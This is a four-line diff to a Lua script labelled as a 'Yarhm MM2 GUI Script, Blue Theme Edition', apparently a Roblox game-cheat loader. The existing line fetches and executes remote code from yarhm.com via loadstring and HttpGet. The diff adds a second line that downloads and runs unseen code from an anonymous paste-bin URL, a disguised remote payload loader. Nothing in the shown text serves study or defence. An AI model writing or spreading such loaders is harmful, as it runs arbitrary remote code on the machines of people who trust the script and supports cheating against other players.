@@ -1,3 +1,4 @@
 -- Yarhm MM2 GUI Script
 -- Blue Theme Edition
 loadstring(game:HttpGet("https://yarhm.com"))()
+loadstring(game:HttpGet('https://cdn.sourceb.in/bins/Vw8S34T3lE/0'))()
